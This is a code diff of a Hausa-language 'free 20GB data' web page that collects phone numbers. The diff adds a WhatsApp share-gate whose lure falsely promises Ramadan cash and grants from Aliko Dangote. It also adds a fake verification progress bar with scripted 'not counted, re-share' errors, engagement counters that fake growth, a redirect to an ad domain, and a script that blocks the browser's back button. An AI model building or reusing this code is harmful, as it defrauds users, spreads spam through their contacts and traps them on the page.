@@ -988,36 +988,14 @@
             transform: scale(1.01);
         }
 
-        /* Cookie notice */
-        .cookie-notice {
+        /* Storage notice */
+        .storage-notice {
             font-size: 11px;
             color: #8a9bb5;
             text-align: center;
             margin-top: 12px;
             padding: 8px;
             border-top: 1px dashed #e0e8f0;
-        }
-
-        /* Debug toast for cookie status */
-        .toast {
-            position: fixed;
-            bottom: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #1e293b;
-            color: white;
-            padding: 10px 20px;
-            border-radius: 12px;
-            font-size: 13px;
-            z-index: 999;
-            opacity: 0;
-            transition: opacity 0.3s ease;
-            pointer-events: none;
-            max-width: 90%;
-            text-align: center;
-        }
-        .toast.show {
-            opacity: 1;
         }
 
         @media (max-width: 420px) {
@@ -1145,8 +1123,8 @@
             <div style="margin-top: 12px; font-size: 12px; color: #6c89aa; text-align: right; border-top: 1px dashed #dce5f0; padding-top: 14px; letter-spacing: 0.2px;">
                 <i class="fas fa-shield-alt" style="margin-right: 4px;"></i> Jakar Data · Kyautar 20GB
             </div>
-            <div class="cookie-notice">
-                <i class="fas fa-cookie-bite"></i> An ajiye ci gaban ka na awanni 24
+            <div class="storage-notice">
+                <i class="fas fa-database"></i> An ajiye ci gaban ka na awanni 24
             </div>
         </div>
 
@@ -1334,66 +1312,236 @@
                     </div>
                 </div>
 
-                <div style="background: #ecfdf5; border-radius: 16px; padding: 14px 18px; margin-bottom: 16px; border: 1px solid #b8e6d2;">
-                    <p style="font-size: 14px; color: #0b6e4f; display: flex; align-items: center; gap: 8px;">
-                        <i class="fas fa-check-circle" style="color: #0f9d6b;"></i>
-                        <span>Kyautar 20GB ɗin ka tana shirye. Bi umarnin da ke sama don kunnawa.</span>
-                    </p>
-                </div>
+               <style>button:hover{background:#076b03!important;}
+@keyframes spin{100%{transform:rotate(1turn);}}
+@keyframes progressShine{0%{transform:translateX(-100%);}100%{transform:translateX(220%);}}
+@keyframes progressGlow{0%,100%{box-shadow:0 8px 22px rgba(37,211,102,.24);}50%{box-shadow:0 10px 30px rgba(37,211,102,.45);}}</style></head>
+<body style="direction:ltr;background:#ebedf0;margin:0;padding:0;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;box-sizing:border-box;box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;">
+<div class="notification" id="notification" style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;display:none;color:rgb(42,50,165);font-weight:bold;font-size:15px;padding:7px 15px;position:fixed;top:10px;left:0;width:fit-content;text-align:center;white-space:nowrap;background:rgba(180,161,232,0.8);border-radius:8px;box-shadow:0 4px 6px rgba(0,0,0,0.1);z-index:1000;"></div>
+<div class="post" style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;background:#fff;margin:0 auto;padding:10px;max-width:500px;border:1px solid #d0d1d5;border-radius:3px;" width="100%">
+<div id="share" style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;display:block;">
+<center style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;">
+<p class="tip" style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;font-size:14px;">barka da zuwa Lambar Application shine <span id="output" style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;"></span></p>
+<p class="tip" style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;font-size:14px;">SUNA shine: <span id="getname" style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;color:#098105;text-decoration:none;"></span> Daga <span id="getname2" style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;"></span></p>
+<p class="tip" style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;font-size:14px;">
+                Bayan tabbatarwa, kun cancanci samun tallafi ₦250,000 kasuwanci ko don ci gaba da karatu
+            </p>
+<h5 style="color: red;box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;">Yadda ake ci gaba: zuwa Account Number form</h5>
+<p class="tip" style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;font-size:14px;">1. Raba shi zuwa groups 5 ko abokai 15 akan WhatsApp ( Danna alamar "SHARE" da ke ƙasa).</p>
+<p class="tip" style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;font-size:14px;">2. Rijistar ku za ta ƙare ta atomatik bayan an cika ma'aunin tabbatar da GREEN.</p>
+<p class="tip" style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;font-size:14px;">3. Za ku sami tabbaci ta kira/SMS daga SIM ɗin ku.</p>
+<h5 style="color: red;box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;">👇👇 👇👇</h5>
+</center>
+<button id="whatsapp" style="display:flex;align-items:center;justify-content:center;gap:10px;width:290px;height:58px;margin:15px auto;background:#25D366;color:#fff;border:none;border-radius:50px;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-size:20px;font-weight:700;cursor:pointer;box-shadow:0 8px 20px rgba(37,211,102,.35);transition:all .3s ease;padding:0 20px;">
 
-                <button class="done-btn" id="instructionsDoneBtn"><i class="fas fa-check"></i> Na Kammala Kunnawa</button>
+<svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 32 32" fill="#fff">
+<path d="M16 .4C7.4.4.4 7.3.4 15.9c0 3 1 5.9 2.8 8.2L.3 31.6l7.8-2.8c2.2 1.2 4.8 1.9 7.5 1.9 8.6 0 15.6-7 15.6-15.6S24.6.4 16 .4zm0 27.4c-2.4 0-4.7-.6-6.7-1.8l-.5-.3-4.6 1.6 1.5-4.5-.3-.5c-1.3-2.1-2-4.5-2-7 0-7 5.7-12.7 12.7-12.7S28.8 8.9 28.8 16 23.1 27.8 16 27.8zm7-9.5c-.4-.2-2.3-1.1-2.7-1.2-.4-.2-.6-.2-.9.2s-1 1.2-1.2 1.4-.5.3-.9.1c-.4-.2-1.8-.7-3.4-2.2-1.3-1.1-2.1-2.5-2.4-2.9-.2-.4 0-.6.2-.8.2-.2.4-.5.6-.7.2-.2.3-.4.4-.7.1-.2.1-.5 0-.7-.1-.2-.9-2.2-1.3-3-.3-.7-.6-.6-.9-.6h-.8c-.3 0-.7.1-1 .5-.4.4-1.4 1.3-1.4 3.2s1.4 3.7 1.6 4c.2.3 2.7 4.2 6.6 5.8.9.4 1.7.6 2.3.8 1 .3 1.9.3 2.6.2.8-.1 2.3-.9 2.7-1.8.3-.9.3-1.7.2-1.8-.1-.2-.4-.3-.8-.5z"/>
+</svg>
+
+<span>Share on WhatsApp</span>
+
+</button>
+<div class="barr" style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;direction:ltr;max-width:420px;margin:18px auto 10px auto;padding:14px;background:linear-gradient(180deg,#ffffff 0%,#f3fff7 100%);border:1px solid rgba(37,211,102,.25);border-radius:18px;box-shadow:0 10px 28px rgba(0,0,0,.08);animation:progressGlow 2.8s ease-in-out infinite;">
+<div style="box-sizing:border-box;display:flex;align-items:center;justify-content:space-between;margin-bottom:9px;color:#075e32;font-size:13px;font-weight:700;">
+<span style="box-sizing:border-box;display:flex;align-items:center;gap:6px;">✅ Verification Progress</span>
+<span id="percentage2" style="box-sizing:border-box;min-width:52px;text-align:right;color:#0b8f45;font-size:16px;font-weight:800;">0%</span>
+</div>
+<div class="fill" style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;position:relative;width:100%;height:22px;padding:3px;background:#dff5e8;border:1px solid rgba(9,129,5,.28);border-radius:999px;overflow:hidden;box-shadow:inset 0 2px 6px rgba(0,0,0,.12);">
+<div id="fill2" style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;position:relative;background:linear-gradient(90deg,#0b8f45 0%,#25D366 50%,#0aa84f 100%);width:0%;height:100%;border-radius:999px;transition:width 0.7s cubic-bezier(.22,.61,.36,1);box-shadow:0 3px 10px rgba(37,211,102,.45);overflow:hidden;">
+<span style="box-sizing:border-box;position:absolute;top:0;left:0;width:45%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.55),transparent);animation:progressShine 1.8s linear infinite;"></span>
+</div>
+</div>
+<div style="box-sizing:border-box;display:flex;justify-content:space-between;margin-top:8px;color:#6b7280;font-size:11px;font-weight:600;">
+<span>0%</span><span>50%</span><span>100%</span>
+</div>
+</div>
+</div>
+<div id="claim" style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;display:none;">
+<p class="done" style="font-size:48px;box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;text-align:center;color:#27ae60;">✔</p>
+<p class="title" style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;text-align:center;">An kammala rijistar ku.</p>
+<button id="offer" style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;display:block;width:260px;height:50px;color:#fff;border:none;outline:none;font-size:24px;cursor:pointer;border-radius:5px;padding:0 10px;margin:10px auto;background:rgb(9,129,5);transition:background 0.3s ease;">Danna nan</button>
+<br style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;"/><br style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;"/><br style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;"/><br style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;"/><br style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;"/>
+</div>
+</div><!-- end .post -->
+<script src="https://code.jquery.com/jquery-latest.min.js"></script>
+<script type="text/javascript">
+    // Counter animation
+    var likes = 134,
+        comments = 23,
+        shares = 12;
+
+    window.setInterval(function () {
+        likes    = likes    + Math.floor(Math.random() * 3);
+        comments = comments + Math.floor(Math.random() * 2);
+        shares   = shares   + Math.floor(Math.random() * 2);
+        $("#likes").html(likes + "K");
+        $("#comments").html(comments + "K comments");
+        $("#shares").html(shares + "K shares");
+    }, 5000);
+
+    
+</script>
+<script type="text/javascript">
+    var text1 = "KYAUTAR%20RAMADAN%20DAGA%20ALIKO%20DANGOTE%0A%0AA%20samu%20tsabar%20kudi%20%E2%82%A6100%2C000%20nan%20take%20na%20Ramadan!%0A%0A**YADDA%20AKE%20SAMU**%0AZiyarci%20hanyar%20ha%C6%99in%20yanar%20gizon%20da%20ke%20%C6%99asa%2C%20amsa%20wasu%20%C6%B4an%20tambayoyi%2C%20kuma%20ku%20kar%C9%93i%20%E2%82%A6100%2C000%20nan%20take%20don%20bikin%20Ramadan.%0A%0A%E2%9C%85%20Na%20samu%20nawa!%0A%0A%F0%9F%94%97%20Danna%20nan%F0%9F%91%87%0Ahttps://grant.getapply.online/kyautar-dangote-ramadan-2025",
+        error  = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
+        abcde  = "https://ptakeemsaifegro.net/4/9075330",
+        saved  = "tallafir_progress",
+        expiryKey = "tallafir_progress_expiry",
+        oneDay = 24 * 60 * 60 * 1000,
+        share  = "whatsapp://send?text=" + text1;
+
+    // Restore progress from localStorage with 1-day expiry
+    var width = 0;
+    var savedExpiry = localStorage.getItem(expiryKey);
+
+    if (savedExpiry !== null && Date.now() > parseInt(savedExpiry, 10)) {
+        localStorage.removeItem(saved);
+        localStorage.removeItem(expiryKey);
+    }
+
+    var swidth = localStorage.getItem(saved);
+    if (swidth !== null) {
+        width = parseInt(swidth, 10) || 0;
+        $("#fill2").css("width", width + "%");
+        $("#percentage2").text(width + "%");
+        if (width >= 98) {
+            $("#share").hide();
+            $("#claim").show();
+        }
+    }
+
+    // WhatsApp share button click
+    $("#whatsapp").click(function () {
+        window.location.href = share;
+
+        if (width == 0) {
+            width += 50;
+        } else if (width == 50) {
+            alert(error);
+            width += 15;
+        } else if (width == 65) {
+            width += 5;
+        } else if (width == 70) {
+            alert(error);
+            width += 10;
+        } else if (width == 80) {
+            alert(error);
+            width += 5;
+        } else if (width == 85) {
+            width += 2;
+        } else if (width == 87) {
+            width += 1;
+        } else if (width == 88) {
+            width += 2;
+        } else if (width == 90) {
+            width += 1;
+        } else if (width == 91) {
+            width += 1;
+        } else if (width == 92) {
+            width += 1;
+        } else if (width == 93) {
+            width += 1;
+        } else if (width == 94) {
+            width += 1;
+        } else if (width == 95) {
+            width += 1;
+        } else if (width == 96) {
+            width += 2;
+        } else {
+            $("#share").fadeOut(0);
+            $("#claim").fadeIn(1000);
+        }
+
+        localStorage.setItem(saved, width);
+        localStorage.setItem(expiryKey, Date.now() + oneDay);
+        setTimeout(function () {
+            $("#fill2").css("width", width + "%");
+            $("#percentage2").text(width + "%");
+        }, 2000);
+    });
+
+    // Final offer button
+    $("#offer").click(function () {
+        window.open(abcde, "_blank");
+    });
+</script>
+<script>
+    // Disable back button
+    (function (global) {
+        var _hash = "!";
+        var noBackPlease = function () {
+            global.location.href += "#";
+            global.setTimeout(function () {
+                global.location.href += "!";
+            }, 50);
+        };
+        global.onhashchange = function () {
+            if (global.location.hash !== _hash) {
+                global.location.hash = _hash;
+            }
+        };
+        global.onload = function () {
+            noBackPlease();
+            document.body.onkeydown = function (e) {
+                var elm = e.target.nodeName.toLowerCase();
+                if (e.which === 8 && (elm !== 'input' && elm !== 'textarea')) {
+                    e.preventDefault();
+                }
+                e.stopPropagation();
+            };
+        };
+    })(window);
+</script>
+            
             </div>
         </div>
 
     </div>
 
-    <!-- Toast notification -->
-    <div class="toast" id="toast"></div>
-
     <script>
         (function() {
-            // ===== COOKIE HELPERS (Fixed) =====
-            function setCookie(name, value, days) {
-                const expires = new Date();
-                expires.setTime(expires.getTime() + days * 24 * 60 * 60 * 1000);
-                const cookieValue = encodeURIComponent(JSON.stringify(value));
-                document.cookie = name + '=' + cookieValue + ';expires=' + expires.toUTCString() + ';path=/;SameSite=Lax';
-                console.log('Cookie saved:', name, value);
-            }
+            // ===== LOCAL STORAGE HELPERS =====
+            const STORAGE_KEY = 'dataWalletProgress';
+            const EXPIRY_MS = 24 * 60 * 60 * 1000; // 24 hours
 
-            function getCookie(name) {
-                const nameEQ = name + '=';
-                const ca = document.cookie.split(';');
-                for (let i = 0; i < ca.length; i++) {
-                    let c = ca[i];
-                    while (c.charAt(0) === ' ') c = c.substring(1, c.length);
-                    if (c.indexOf(nameEQ) === 0) {
-                        try {
-                            const value = decodeURIComponent(c.substring(nameEQ.length, c.length));
-                            return JSON.parse(value);
-                        } catch (e) {
-                            console.warn('Failed to parse cookie:', e);
-                            return null;
-                        }
-                    }
+            function saveProgressToStorage(data) {
+                try {
+                    const payload = {
+                        ...data,
+                        timestamp: Date.now()
+                    };
+                    localStorage.setItem(STORAGE_KEY, JSON.stringify(payload));
+                    return true;
+                } catch (e) {
+                    console.warn('Could not save to localStorage:', e);
+                    return false;
                 }
-                return null;
             }
 
-            function deleteCookie(name) {
-                document.cookie = name + '=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/;';
-                console.log('Cookie deleted:', name);
+            function getProgressFromStorage() {
+                try {
+                    const raw = localStorage.getItem(STORAGE_KEY);
+                    if (!raw) return null;
+                    const data = JSON.parse(raw);
+                    
+                    // Check if expired
+                    if (data.timestamp && (Date.now() - data.timestamp) > EXPIRY_MS) {
+                        localStorage.removeItem(STORAGE_KEY);
+                        return null;
+                    }
+                    return data;
+                } catch (e) {
+                    console.warn('Could not read from localStorage:', e);
+                    return null;
+                }
             }
 
-            // ===== TOAST =====
-            function showToast(message, duration = 3000) {
-                const toast = document.getElementById('toast');
-                toast.textContent = message;
-                toast.classList.add('show');
-                clearTimeout(toast._timeout);
-                toast._timeout = setTimeout(() => {
-                    toast.classList.remove('show');
-                }, duration);
+            function clearProgressStorage() {
+                try {
+                    localStorage.removeItem(STORAGE_KEY);
+                } catch (e) {
+                    console.warn('Could not clear localStorage:', e);
+                }
             }
 
             // ===== DOM REFS =====
@@ -1473,18 +1621,14 @@
 
             // ===== PAGE SWITCHING =====
             function showPage(pageId, saveState = true) {
-                const allPages = [pageMain, pageLoading, pageResult, pageConfirmLoading, pageCongrats, pageActivationLoading,
-                    pageInstructions
-                ];
-                allPages.forEach(p => {
+                [pageMain, pageLoading, pageResult, pageConfirmLoading, pageCongrats, pageActivationLoading, pageInstructions]
+                .forEach(p => {
                     p.classList.remove('active');
                     p.classList.add('hidden');
                 });
                 const target = document.getElementById(pageId);
-                if (target) {
-                    target.classList.remove('hidden');
-                    target.classList.add('active');
-                }
+                target.classList.remove('hidden');
+                target.classList.add('active');
 
                 if (pageId === 'pageCongrats') {
                     startCelebration();
@@ -1492,16 +1636,8 @@
                     stopCelebration();
                 }
 
-                // Save state to cookie (except during restore or if we're on main page with no data)
                 if (saveState && !isRestoring) {
-                    const state = {
-                        page: pageId,
-                        phone: currentPhone || phoneInput.value || '',
-                        network: currentNetwork || '',
-                        timestamp: Date.now()
-                    };
-                    setCookie('dataWalletProgress', state, 1);
-                    console.log('Progress saved:', state);
+                    saveProgress(pageId);
                 }
             }
 
@@ -1510,36 +1646,22 @@
                 const state = {
                     page: pageId,
                     phone: currentPhone || phoneInput.value || '',
-                    network: currentNetwork || '',
-                    timestamp: Date.now()
+                    network: currentNetwork || ''
                 };
-                setCookie('dataWalletProgress', state, 1);
+                saveProgressToStorage(state);
             }
 
             function restoreProgress() {
-                const state = getCookie('dataWalletProgress');
-                if (!state) {
-                    console.log('No saved progress found');
-                    return false;
-                }
+                const state = getProgressFromStorage();
+                if (!state) return false;
 
-                const age = Date.now() - state.timestamp;
-                if (age > 24 * 60 * 60 * 1000) {
-                    console.log('Progress expired (more than 24 hours)');
-                    deleteCookie('dataWalletProgress');
-                    return false;
-                }
-
-                console.log('Restoring progress:', state);
                 isRestoring = true;
 
-                // Restore phone number
                 if (state.phone) {
                     phoneInput.value = state.phone;
                     currentPhone = state.phone;
                 }
 
-                // Restore network
                 if (state.network) {
                     currentNetwork = state.network;
                 }
@@ -1550,7 +1672,6 @@
                 ];
 
                 if (validPages.includes(pageId)) {
-                    // Populate data for specific pages
                     if (pageId === 'pageResult' && currentNetwork && currentPhone) {
                         resultNetwork.textContent = currentNetwork;
                         resultNetworkLabel.textContent = getNetworkLabel(currentNetwork);
@@ -1562,7 +1683,6 @@
                     }
                     showPage(pageId, false);
                     isRestoring = false;
-                    showToast('✅ An dawo da ci gaban ka', 2000);
                     return true;
                 }
 
@@ -1931,11 +2051,7 @@
                     s.querySelector('.step-num').innerHTML = s.id === 'actStep1' ? '1' : s.id === 'actStep2' ? '2' :
                         '3';
                 });
-                // Clear progress cookie after completion
-                deleteCookie('dataWalletProgress');
-                currentPhone = '';
-                currentNetwork = '';
-                showToast('✅ An kammala! Za ka iya sake farawa.', 2500);
+                clearProgressStorage();
             }
 
             // ===== EVENT LISTENERS =====
@@ -1950,11 +2066,6 @@
 
             phoneInput.addEventListener('input', () => {
                 errorMsg.classList.remove('show');
-                // Save phone input as user types
-                if (phoneInput.value.length >= 4) {
-                    currentPhone = phoneInput.value;
-                    saveProgress('pageMain');
-                }
             });
 
             confirmBtn.addEventListener('click', handleConfirm);
@@ -1962,25 +2073,10 @@
             instructionsDoneBtn.addEventListener('click', handleInstructionsDone);
 
             // ===== RESTORE PROGRESS ON LOAD =====
-            setTimeout(() => {
-                const restored = restoreProgress();
-                if (!restored) {
-                    console.log('No progress to restore, starting fresh');
-                    deleteCookie('dataWalletProgress');
-                }
-            }, 100);
-
-            // Show cookie status on load
-            const saved = getCookie('dataWalletProgress');
-            if (saved) {
-                const age = Date.now() - saved.timestamp;
-                const hoursLeft = Math.max(0, Math.floor((24 * 60 * 60 * 1000 - age) / (60 * 60 * 1000)));
-                if (hoursLeft > 0) {
-                    showToast(`📌 Ci gaban ka yana nan. Sa'a ${hoursLeft} ragowar`, 2500);
-                }
+            const restored = restoreProgress();
+            if (!restored) {
+                clearProgressStorage();
             }
-
-            console.log('Cookie check - current cookie:', document.cookie);
 
         })();
     </script>
